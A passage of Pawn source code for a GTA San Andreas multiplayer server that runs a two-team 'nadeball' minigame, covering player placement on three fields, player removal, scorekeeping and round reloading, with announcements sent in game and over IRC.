                player[playerid][playernbteam] = 1;
				SetPlayerPos(playerid, 745.26 + (nbteam1players / 1.5), -1226.99 + (nbteam1players / 1.5), 13.34);
				SetPlayerFacingAngle(playerid, 180.0);
				SetPlayerColor(playerid, nbteam1colour);
				nbteam1players++;
		    }
			SetCameraBehindPlayer(playerid);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerTeam(playerid, TEAM_NADEBALL);
			ResetPlayerWeapons(playerid);
	  		TogglePlayerControllable(playerid, 0);
	  		GivePlayerWeapon(playerid, 16, 1000);
			TextDrawHideForPlayer(playerid, nbhelptd1);
			TextDrawHideForPlayer(playerid, nbhelptd2);

			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[playerid][i][so_object]);
					pSObject[playerid][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
				RemovePlayerAttachedObject(playerid, pi);
			}
		} else if (nbfield == 2) // 2 = SF
		{
		    if (nbplayers > MAX_NADEBALL_PLAYERS)
		    {
				SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
				return 1;
			}

			SetPlayerVirtualWorld(playerid, WORLDID_NADEBALL);
			SetPlayerInterior(playerid, 0);

			player[playerid][antifall] 	= 0;
			player[playerid][godmode] 	= 1;
		 	player[playerid][running] 	= 0;
		 	player[playerid][walking]	= 0;
		    player[playerid][skating] 	= 0;
		    player[playerid][swimming] 	= 0;
			if (player[playerid][strew] == 1)
			{
				player[playerid][strew] = 0;
				KillTimer(player[playerid][aftimer]);
				DestroyPlayerObject(playerid, player[playerid][strewid]);
				player[playerid][strewid] = -1;
			}

			for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
			{
			    if (nbplayerlist[listplayers] == -1)
			    {
				  	nbplayerlist[listplayers] = playerid;
				  	break;
			  	}
			}

			player[playerid][playernbmode] = 1;
		    if (nbteam1players > nbteam2players)
		    {
                player[playerid][playernbteam] = 2;
				SetPlayerPos(playerid, -2780.665 + (nbteam2players / 1.5), -241.27 + (nbteam2players / 1.5), 7.15);
				SetPlayerFacingAngle(playerid, 0.0);
				SetPlayerColor(playerid, nbteam2colour);
				nbteam2players++;
		    } else {
                player[playerid][playernbteam] = 1;
				SetPlayerPos(playerid, -2762.635 + (nbteam1players / 1.5), -241.27 + (nbteam1players / 1.5), 7.15);
				SetPlayerFacingAngle(playerid, 180.0);
				SetPlayerColor(playerid, nbteam1colour);
				nbteam1players++;
		    }
			SetCameraBehindPlayer(playerid);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerTeam(playerid, TEAM_NADEBALL);
			ResetPlayerWeapons(playerid);
	  		TogglePlayerControllable(playerid, 0);
	  		GivePlayerWeapon(playerid, 16, 1000);
			TextDrawHideForPlayer(playerid, nbhelptd1);
			TextDrawHideForPlayer(playerid, nbhelptd2);

			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[playerid][i][so_object]);
					pSObject[playerid][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
				RemovePlayerAttachedObject(playerid, pi);
			}
		} else { // 2 = LV
		    if (nbplayers > MAX_NADEBALL_PLAYERS)
		    {
				SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
				return 1;
			}

			SetPlayerVirtualWorld(playerid, WORLDID_NADEBALL);
			SetPlayerInterior(playerid, 0);

			player[playerid][antifall] 	= 0;
			player[playerid][godmode] 	= 1;
		 	player[playerid][running] 	= 0;
		 	player[playerid][walking]	= 0;
		    player[playerid][skating] 	= 0;
		    player[playerid][swimming] 	= 0;
			if (player[playerid][strew] == 1)
			{
				player[playerid][strew] = 0;
				KillTimer(player[playerid][aftimer]);
				DestroyPlayerObject(playerid, player[playerid][strewid]);
				player[playerid][strewid] = -1;
			}

			for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
			{
			    if (nbplayerlist[listplayers] == -1)
			    {
				  	nbplayerlist[listplayers] = playerid;
				  	break;
			  	}
			}

			player[playerid][playernbmode] = 1;
		    if (nbteam1players > nbteam2players)
		    {
                player[playerid][playernbteam] = 2;
				SetPlayerPos(playerid, 1867.49 + (nbteam2players / 1.5), 2826.26 + (nbteam2players / 1.5), 10.83);
				SetPlayerFacingAngle(playerid, 0.0);
				SetPlayerColor(playerid, nbteam2colour);
				nbteam2players++;
		    } else {
                player[playerid][playernbteam] = 1;
				SetPlayerPos(playerid, 1867.49 + (nbteam1players / 1.5), 2838.00 + (nbteam1players / 1.5), 10.83);
				SetPlayerFacingAngle(playerid, 180.0);
				SetPlayerColor(playerid, nbteam1colour);
				nbteam1players++;
		    }
			SetCameraBehindPlayer(playerid);
			SetPlayerArmour(playerid, 0.0);
			SetPlayerTeam(playerid, TEAM_NADEBALL);
			ResetPlayerWeapons(playerid);
	  		TogglePlayerControllable(playerid, 0);
	  		GivePlayerWeapon(playerid, 16, 1000);
			TextDrawHideForPlayer(playerid, nbhelptd1);
			TextDrawHideForPlayer(playerid, nbhelptd2);

			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[playerid][i][so_object]);
					pSObject[playerid][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
				RemovePlayerAttachedObject(playerid, pi);
			}
		}
	}
	
	if (nbplayers == MAX_NADEBALL_PLAYERS && nbsecondsleft >= 10)
	{
		LoadNB();
	    nbsecondsleft = 9;
	}
	return 1;
}

stock RemoveNBPlayer(playerid, reason[])
{
	if (player[playerid][playernbteam] == 1) nbteam1players--;
	else nbteam2players--;
	
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[S]: "EMBED_CORAL"%s left nadeball. (%s)", playername, reason);
	for (new acp = 0; acp < MAX_PLAYERS; acp++)
	{
		if (IsPlayerConnected(acp) && player[acp][playingnb] == 1)
		SendClientMessage(acp, COLOR_NAVYBLUE, strings);
	}

	format(strings, sizeof(strings), "14 %s left nadeball. (%s)", playername, reason);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	TextDrawHideForPlayer(playerid, nbhelptd1);
	TextDrawHideForPlayer(playerid, nbhelptd2);
	SetPlayerTeam(playerid, playerid);

    if (nbplayers <= 1 && nbstarted == false)
	{
		StopNB();
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
			{
				if (!servergodmode) player[cp][godmode] = 0;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingnb] = 0;
				player[cp][playernbteam] = 0;
				player[cp][playernbmode] = 0;
				if (IsPlayerInAnyVehicle(cp)) RemovePlayerFromVehicleEx(cp);
				SpawnPlayer(cp);
				SetPlayerTeam(cp, cp);
			}
		}
		SendServerMessageToAll(EMBED_CORAL, "Stopped Nadeball. (No winner found)");
		IRC_GroupSay(1, IRC_CHANNEL, "14Stopped Nadeball. (No winner found)");
	} else {
	    if (nbteam2players == 0)
	    {
		    nbgames++;
		    nbteam1wins++;
		    
	        if (nbfield == 1)
	        {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, 745.26, -1226.99+10, 13.34+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, 745.26, -1226.99+10, 13.34+13);
				            SetPlayerCameraLookAt(cp, 745.26, -1226.99, 13.34+3.5);
			            } else {
				            SetPlayerCameraPos(cp, 745.37, -1248.72-10, 13.34+13);
				            SetPlayerCameraLookAt(cp, 745.37, -1248.72, 13.34+3.5);
			            }
					}
				}
			} else if (nbfield == 2)
	        {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, -2762.635, -241.27+10, 7.15+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, -2762.635+10, -241.27, 7.15+13);
				            SetPlayerCameraLookAt(cp, -2762.635, -241.27, 7.15+3.5);
			            } else {
				            SetPlayerCameraPos(cp, -2780.665-10, -241.27, 7.15+13);
				            SetPlayerCameraLookAt(cp, -2780.665, -241.27, 7.15+3.5);
			            }
					}
				}
			} else {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, 1867.49, 2838.00+10, 10.83+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, 1867.49, 2838.00+10, 10.83+13);
				            SetPlayerCameraLookAt(cp, 1867.49, 2838.00, 10.83+3.5);
			            } else {
				            SetPlayerCameraPos(cp, 1867.49, 2826.26-10, 10.83+13);
				            SetPlayerCameraLookAt(cp, 1867.49, 2826.26, 10.83+3.5);
			            }
					}
				}
			}
			format(stringe, sizeof(stringe), "Scoreboard: team \"The PEPINOs\" %d - %d team \"The FRAGs\" [Game %d/%d]", nbteam1wins, nbteam2wins, nbgames, DEFAULT_NADEBALL_GAMES);
			SendServerMessageToAll(EMBED_CORAL, stringe);
		    format(ircstring, sizeof(ircstring), "14%s", stringe);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	    } else if (nbteam1players == 0)
	    {
		    nbgames++;
		    nbteam2wins++;

	        if (nbfield == 1)
	        {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, 745.26, -1226.99+10, 13.34+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, 745.26, -1226.99+10, 13.34+13);
				            SetPlayerCameraLookAt(cp, 745.26, -1226.99, 13.34+3.5);
			            } else {
				            SetPlayerCameraPos(cp, 745.37, -1248.72-10, 13.34+13);
				            SetPlayerCameraLookAt(cp, 745.37, -1248.72, 13.34+3.5);
			            }
					}
				}
			} else if (nbfield == 2)
	        {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, -2762.635, -241.27+10, 7.15+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, -2762.635+10, -241.27, 7.15+13);
				            SetPlayerCameraLookAt(cp, -2762.635, -241.27, 7.15+3.5);
			            } else {
				            SetPlayerCameraPos(cp, -2780.665-10, -241.27, 7.15+13);
				            SetPlayerCameraLookAt(cp, -2780.665, -241.27, 7.15+3.5);
			            }
					}
				}
			} else {
		        for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						player[cp][playernbmode] = 0;
				        TogglePlayerControllable(cp, 0);
				        SetPlayerPos(cp, 1867.49, 2838.00+10, 10.83+50);
				        if (player[cp][playernbteam] == 1)
					    {
				            SetPlayerCameraPos(cp, 1867.49, 2838.00+10, 10.83+13);
				            SetPlayerCameraLookAt(cp, 1867.49, 2838.00, 10.83+3.5);
			            } else {
				            SetPlayerCameraPos(cp, 1867.49, 2826.26-10, 10.83+13);
				            SetPlayerCameraLookAt(cp, 1867.49, 2826.26, 10.83+3.5);
			            }
					}
				}
			}
			format(stringe, sizeof(stringe), "Scoreboard: team \"The PEPINOs\" %d - %d team \"The FRAGs\" [Game %d/%d]", nbteam1wins, nbteam2wins, nbgames, DEFAULT_NADEBALL_GAMES);
			SendServerMessageToAll(EMBED_CORAL, stringe);
		    format(ircstring, sizeof(ircstring), "14%s", stringe);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	    } else {
			player[playerid][playernbmode] = 0;
 			TogglePlayerControllable(playerid, 0);
	        if (nbfield == 1)
	        {
		        SetPlayerPos(playerid, 745.26, -1226.99+10, 13.34+50);
		        if (player[playerid][playernbteam] == 1)
			    {
		            SetPlayerCameraPos(playerid, 745.26, -1226.99+10, 13.34+13);
		            SetPlayerCameraLookAt(playerid, 745.26, -1226.99, 13.34+3.5);
	            } else {
		            SetPlayerCameraPos(playerid, 745.37, -1248.72-10, 13.34+13);
		            SetPlayerCameraLookAt(playerid, 745.37, -1248.72, 13.34+3.5);
				}
			} else if (nbfield == 2)
	        {
		        SetPlayerPos(playerid, -2762.635, -241.27+10, 7.15+50);
		        if (player[playerid][playernbteam] == 1)
			    {
		            SetPlayerCameraPos(playerid, -2762.635+10, -241.27, 7.15+13);
		            SetPlayerCameraLookAt(playerid, -2762.635, -241.27, 7.15+3.5);
	            } else {
		            SetPlayerCameraPos(playerid, -2780.665-10, -241.27, 7.15+13);
		            SetPlayerCameraLookAt(playerid, -2780.665, -241.27, 7.15+3.5);
				}
			} else {
		        SetPlayerPos(playerid, 1867.49, 2838.00+10, 10.83+50);
		        if (player[playerid][playernbteam] == 1)
			    {
		            SetPlayerCameraPos(playerid, 1867.49, 2838.00+10, 10.83+13);
		            SetPlayerCameraLookAt(playerid, 1867.49, 2838.00, 10.83+3.5);
	            } else {
		            SetPlayerCameraPos(playerid, 1867.49, 2826.26-10, 10.83+13);
		            SetPlayerCameraLookAt(playerid, 1867.49, 2826.26, 10.83+3.5);
	            }
			}
	    }
	    
        if (nbgames == DEFAULT_NADEBALL_GAMES)
        {
		    new winnername[24];
			if (nbteam1wins > nbteam2wins)
			{
				format(stringe, sizeof(stringe), "Team \"The PEPINOs\" have won the nadeball event with %d of %d games! (Members:", nbteam1wins, DEFAULT_NADEBALL_GAMES);
				for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						if (!servergodmode) player[cp][godmode] = 0;
						SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
						player[cp][playingnb] = 0;
						SpawnPlayer(cp);
						SetPlayerTeam(cp, cp);

						if (player[cp][playernbteam] == 1)
						{
							GetPlayerName(cp, winnername, sizeof(winnername));
							format(stringe, sizeof(stringe), "%s %s", stringe, winnername);
						}
						player[cp][playernbteam] = 0;
					}
				}
			    format(stringe, sizeof(stringe), "%s)", stringe);
				SendMessageToNB("~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~THE ~y~PEPINOS ~b~WON!", 5000);
			} else {
				format(stringe, sizeof(stringe), "Team \"The FRAGs\" have won the nadeball event with %d of %d games! (Members:", nbteam2wins, DEFAULT_NADEBALL_GAMES);
				for (new cp = 0; cp < MAX_PLAYERS; cp++)
				{
					if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
					{
						if (!servergodmode) player[cp][godmode] = 0;
						SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
						player[cp][playingnb] = 0;
						SpawnPlayer(cp);
						SetPlayerTeam(cp, cp);

						if (player[cp][playernbteam] == 2)
						{
							GetPlayerName(cp, winnername, sizeof(winnername));
							format(stringe, sizeof(stringe), "%s %s", stringe, winnername);
						}
						player[cp][playernbteam] = 0;
					}
				}
			    format(stringe, sizeof(stringe), "%s)", stringe);
				SendMessageToNB("~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~THE ~g~FRAGS ~b~WON!", 5000);
			}
			StopNB();
			
			SendServerMessageToAll(EMBED_CORAL, stringe);
		    format(ircstring, sizeof(ircstring), "14%s", stringe);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		} else {
		    if (nbteam1players == 0 || nbteam2players == 0)
		    {
			    nbsecondsleft = 10;
			    nbteam1players = 0;
				nbteam2players = 0;
		    }
		    
		    /*for (new nbP = 0; nbP < MAX_NADEBALL_PLAYERS; nbP++)
			{
			    if (nbplayerlist[nbP] == -1)
			    continue;

				if (nbplayerlist[nbP] == playerid)
				{
					nbplayerlist[nbP] = -1;
					break;
				}
			}*/
		}
	}
	return 1;
}

stock LoadNB()
{
	if (nbplayers < MIN_NADEBALL_PLAYERS)
	{
		SendServerMessageToAll(EMBED_CORAL, "Nadeball was not started because there were not enough players.");
		IRC_GroupSay(1, IRC_CHANNEL, "14Nadeball was not started because there were not enough players.");
		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingnb] == 1)
			{
				GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~                       ~w~NADEBALL ~r~STOPPED!", 2000, 3);
				if (!servergodmode) player[dp][godmode] = 0;
				SetPlayerColor(dp, PlayerColors[random(sizeof(PlayerColors))]);
				player[dp][playingnb] = 0;
				player[dp][playernbteam] = 0;
				player[dp][playernbmode] = 0;
				if (IsPlayerInAnyVehicle(dp)) RemovePlayerFromVehicleEx(dp);
				SpawnPlayer(dp);
				TextDrawHideForPlayer(dp, nbhelptd1);
				TextDrawHideForPlayer(dp, nbhelptd2);
				SetPlayerTeam(dp, dp);

		    }
		}
		StopNB();
	    return 1;
	}

	new rplaceused = 1;
	nbteam1colour = PlayerColors[random(sizeof(PlayerColors))];
	nbteam2colour = PlayerColors[random(sizeof(PlayerColors))+1];

	nbfield = random(3)+1;
	if (nbfield == 1) // 1 = LS
	{
		nbfieldteam1 = CreateDynamicRectangle(737.08, -1238.30, 753.58, -1221.87);
		nbfieldteam2 = CreateDynamicRectangle(737.08, -1254.00, 753.58, -1237.57);

		for (new rp = 0; rp < MAX_PLAYERS; rp++)
		{
			if (IsPlayerConnected(rp) && player[rp][playingnb] == 1)
			{
			    if (rplaceused > MAX_NADEBALL_PLAYERS)
			    {
					SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
					return 1;
				}

				SetPlayerVirtualWorld(rp, WORLDID_NADEBALL);
				SetPlayerInterior(rp, 0);

				player[rp][antifall] 	= 0;
				player[rp][godmode] 	= 1;
			 	player[rp][running] 	= 0;
			 	player[rp][walking]		= 0;
			    player[rp][skating] 	= 0;
			    player[rp][swimming] 	= 0;
				if (player[rp][strew] == 1)
				{
					player[rp][strew] = 0;
					KillTimer(player[rp][aftimer]);
					DestroyPlayerObject(rp, player[rp][strewid]);
					player[rp][strewid] = -1;
				}

				for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
				{
				    if (nbplayerlist[listplayers] == -1)
				    {
					  	nbplayerlist[listplayers] = rp;
					  	break;
				  	}
				}

			    player[rp][playernbmode] = 1;
				if (rplaceused > 1)
				{
				    if (nbteam1players > nbteam2players)
				    {
	                    player[rp][playernbteam] = 2;
						SetPlayerPos(rp, 745.37 + (nbteam2players / 1.5), -1248.72 + (nbteam2players / 1.5), 13.34);
						SetPlayerFacingAngle(rp, 0.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
				    } else {
	                    player[rp][playernbteam] = 1;
						SetPlayerPos(rp, 745.26 + (nbteam1players / 1.5), -1226.99 + (nbteam1players / 1.5), 13.34);
						SetPlayerFacingAngle(rp, 180.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
				    }
				} else {
                    player[rp][playernbteam] = random(2)+1;
					if (player[rp][playernbteam] == 1)
					{
						SetPlayerPos(rp, 745.26 + (nbteam1players / 1.5), -1226.99 + (nbteam1players / 1.5), 13.34);
						SetPlayerFacingAngle(rp, 180.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
					} else {
						SetPlayerPos(rp, 745.37 + (nbteam2players / 1.5), -1248.72 + (nbteam2players / 1.5), 13.34);
						SetPlayerFacingAngle(rp, 0.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
					}
				}
				SetCameraBehindPlayer(rp);
				SetPlayerArmour(rp, 0.0);
				SetPlayerTeam(rp, TEAM_NADEBALL);
				ResetPlayerWeapons(rp);
		  		TogglePlayerControllable(rp, 0);
		  		GivePlayerWeapon(rp, 16, 1000);
				TextDrawHideForPlayer(rp, nbhelptd1);
				TextDrawHideForPlayer(rp, nbhelptd2);

				for (new i = 0; i < VIP_MAX_OSTICKS; i++)
				{
				    if (pSObject[rp][i][so_object] != -1)
				    {
					    DestroyObject(pSObject[rp][i][so_object]);
						pSObject[rp][i][so_object] = -1;
					}
				}

				for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
				{
					if (IsPlayerAttachedObjectSlotUsed(rp, pi))
					RemovePlayerAttachedObject(rp, pi);
				}
				rplaceused++;
			}
		}
	} else if (nbfield == 2) // 2 = SF
	{
		nbfieldteam1 = CreateDynamicRectangle(-2771.30, -250.45, -2753.27, -232.09);
		nbfieldteam2 = CreateDynamicRectangle(-2790.03, -250.45, -2772.00, -232.09);

		for (new rp = 0; rp < MAX_PLAYERS; rp++)
		{
			if (IsPlayerConnected(rp) && player[rp][playingnb] == 1)
			{
			    if (rplaceused > MAX_NADEBALL_PLAYERS)
			    {
					SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
					return 1;
				}

				SetPlayerVirtualWorld(rp, WORLDID_NADEBALL);
				SetPlayerInterior(rp, 0);

				player[rp][antifall] 	= 0;
				player[rp][godmode] 	= 1;
			 	player[rp][running] 	= 0;
			 	player[rp][walking]		= 0;
			    player[rp][skating] 	= 0;
			    player[rp][swimming] 	= 0;
				if (player[rp][strew] == 1)
				{
					player[rp][strew] = 0;
					KillTimer(player[rp][aftimer]);
					DestroyPlayerObject(rp, player[rp][strewid]);
					player[rp][strewid] = -1;
				}

				for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
				{
				    if (nbplayerlist[listplayers] == -1)
				    {
					  	nbplayerlist[listplayers] = rp;
					  	break;
				  	}
				}

			    player[rp][playernbmode] = 1;
				if (rplaceused > 1)
				{
				    if (nbteam1players > nbteam2players)
				    {
	                    player[rp][playernbteam] = 2;
						SetPlayerPos(rp, -2780.665 + (nbteam2players / 1.5), -241.27 + (nbteam2players / 1.5), 7.15);
						SetPlayerFacingAngle(rp, -90.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
				    } else {
	                    player[rp][playernbteam] = 1;
						SetPlayerPos(rp, -2762.635 + (nbteam1players / 1.5), -241.27 + (nbteam1players / 1.5), 7.15);
						SetPlayerFacingAngle(rp, 90.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
				    }
				} else {
                    player[rp][playernbteam] = random(2)+1;
					if (player[rp][playernbteam] == 1)
					{
						SetPlayerPos(rp, -2762.635 + (nbteam1players / 1.5), -241.27 + (nbteam1players / 1.5), 7.15);
						SetPlayerFacingAngle(rp, 90.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
					} else {
						SetPlayerPos(rp, -2780.665 + (nbteam2players / 1.5), -241.27 + (nbteam2players / 1.5), 7.15);
						SetPlayerFacingAngle(rp, -90.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
					}
				}
				SetCameraBehindPlayer(rp);
				SetPlayerArmour(rp, 0.0);
				SetPlayerTeam(rp, TEAM_NADEBALL);
				ResetPlayerWeapons(rp);
		  		TogglePlayerControllable(rp, 0);
		  		GivePlayerWeapon(rp, 16, 1000);
				TextDrawHideForPlayer(rp, nbhelptd1);
				TextDrawHideForPlayer(rp, nbhelptd2);

				for (new i = 0; i < VIP_MAX_OSTICKS; i++)
				{
				    if (pSObject[rp][i][so_object] != -1)
				    {
					    DestroyObject(pSObject[rp][i][so_object]);
						pSObject[rp][i][so_object] = -1;
					}
				}

				for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
				{
					if (IsPlayerAttachedObjectSlotUsed(rp, pi))
					RemovePlayerAttachedObject(rp, pi);
				}
				rplaceused++;
			}
		}
	} else { // 3 = LV
		nbfieldteam1 = CreateDynamicRectangle(1861.80, 2831.78, 1873.18, 2844.21);
		nbfieldteam2 = CreateDynamicRectangle(1861.80, 2820.05, 1873.18, 2832.48);
		
		for (new rp = 0; rp < MAX_PLAYERS; rp++)
		{
			if (IsPlayerConnected(rp) && player[rp][playingnb] == 1)
			{
			    if (rplaceused > MAX_NADEBALL_PLAYERS)
			    {
					SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
					return 1;
				}

				SetPlayerVirtualWorld(rp, WORLDID_NADEBALL);
				SetPlayerInterior(rp, 0);

				player[rp][antifall] 	= 0;
				player[rp][godmode] 	= 1;
			 	player[rp][running] 	= 0;
			 	player[rp][walking]		= 0;
			    player[rp][skating] 	= 0;
			    player[rp][swimming] 	= 0;
				if (player[rp][strew] == 1)
				{
					player[rp][strew] = 0;
					KillTimer(player[rp][aftimer]);
					DestroyPlayerObject(rp, player[rp][strewid]);
					player[rp][strewid] = -1;
				}

				for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
				{
				    if (nbplayerlist[listplayers] == -1)
				    {
					  	nbplayerlist[listplayers] = rp;
					  	break;
				  	}
				}

                player[rp][playernbmode] = 1;
				if (rplaceused > 1)
				{
				    if (nbteam1players > nbteam2players)
				    {
	                    player[rp][playernbteam] = 2;
						SetPlayerPos(rp, 1867.49 + (nbteam2players / 1.5), 2826.26 + (nbteam2players / 1.5), 10.83);
						SetPlayerFacingAngle(rp, 0.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
				    } else {
	                    player[rp][playernbteam] = 1;
						SetPlayerPos(rp, 1867.49 + (nbteam1players / 1.5), 2838.00 + (nbteam1players / 1.5), 10.83);
						SetPlayerFacingAngle(rp, 180.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
				    }
				} else {
                    player[rp][playernbteam] = random(2)+1;
					if (player[rp][playernbteam] == 1)
					{
						SetPlayerPos(rp, 1867.49 + (nbteam1players / 1.5), 2838.00 + (nbteam1players / 1.5), 10.83);
						SetPlayerFacingAngle(rp, 180.0);
						SetPlayerColor(rp, nbteam1colour);
						nbteam1players++;
					} else {
						SetPlayerPos(rp, 1867.49 + (nbteam2players / 1.5), 2826.26 + (nbteam2players / 1.5), 10.83);
						SetPlayerFacingAngle(rp, 0.0);
						SetPlayerColor(rp, nbteam2colour);
						nbteam2players++;
					}
				}
				SetCameraBehindPlayer(rp);
				SetPlayerArmour(rp, 0.0);
				SetPlayerTeam(rp, TEAM_NADEBALL);
				ResetPlayerWeapons(rp);
		  		TogglePlayerControllable(rp, 0);
		  		GivePlayerWeapon(rp, 16, 1000);
				TextDrawHideForPlayer(rp, nbhelptd1);
				TextDrawHideForPlayer(rp, nbhelptd2);

				for (new i = 0; i < VIP_MAX_OSTICKS; i++)
				{
				    if (pSObject[rp][i][so_object] != -1)
				    {
					    DestroyObject(pSObject[rp][i][so_object]);
						pSObject[rp][i][so_object] = -1;
					}
				}

				for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
				{
					if (IsPlayerAttachedObjectSlotUsed(rp, pi))
					RemovePlayerAttachedObject(rp, pi);
				}
				rplaceused++;
			}
		}
	}
	return 1;
}

stock ReloadNB()
{
	if (nbplayers < MIN_NADEBALL_PLAYERS)
	{
		StopNB();
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingnb] == 1)
			{
				if (!servergodmode) player[cp][godmode] = 0;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingnb] = 0;
				SpawnPlayer(cp);
				SetPlayerTeam(cp, cp);
				player[cp][playernbteam] = 0;
				player[cp][playernbmode] = 0;
				break;
			}
		}
		SendServerMessageToAll(EMBED_CORAL, "Stopped Nadeball. (Forcing end due unequal teams)");
		IRC_GroupSay(1, IRC_CHANNEL, "14Stopped Nadeball. (Forcing end due unequal teams)");
	    return 1;
	}

	new rplaceused = 0;
	
	DestroyDynamicArea(nbfieldteam1);
	DestroyDynamicArea(nbfieldteam2);
	nbfield = random(3)+1;
	if (nbfield == 1) // 1 = LS
	{
		nbfieldteam1 = CreateDynamicRectangle(737.08, -1238.30, 753.58, -1221.87);
		nbfieldteam2 = CreateDynamicRectangle(737.08, -1254.00, 753.58, -1237.57);

		for (new nbP = 0; nbP < MAX_NADEBALL_PLAYERS; nbP++)
		{
			if (!IsPlayerConnected( nbplayerlist[nbP] ) || nbplayerlist[nbP] == -1)
			continue;

		    if (player[ nbplayerlist[nbP] ][playingnb] == 1)
		    {
			    player[ nbplayerlist[nbP] ][playernbmode] = 1;
				if (player[ nbplayerlist[nbP] ][playernbteam] == 1)
				{
					SetPlayerPos( nbplayerlist[nbP] , 745.26 + (nbteam1players / 1.5), -1226.99 + (nbteam1players / 1.5), 13.34);
					SetPlayerFacingAngle( nbplayerlist[nbP] , 180.0);
					SetPlayerColor( nbplayerlist[nbP] , nbteam1colour);
					nbteam1players++;
				} else {
					SetPlayerPos( nbplayerlist[nbP] , 745.37 + (nbteam2players / 1.5), -1248.72 + (nbteam2players / 1.5), 13.34);
					SetPlayerFacingAngle( nbplayerlist[nbP] , 0.0);
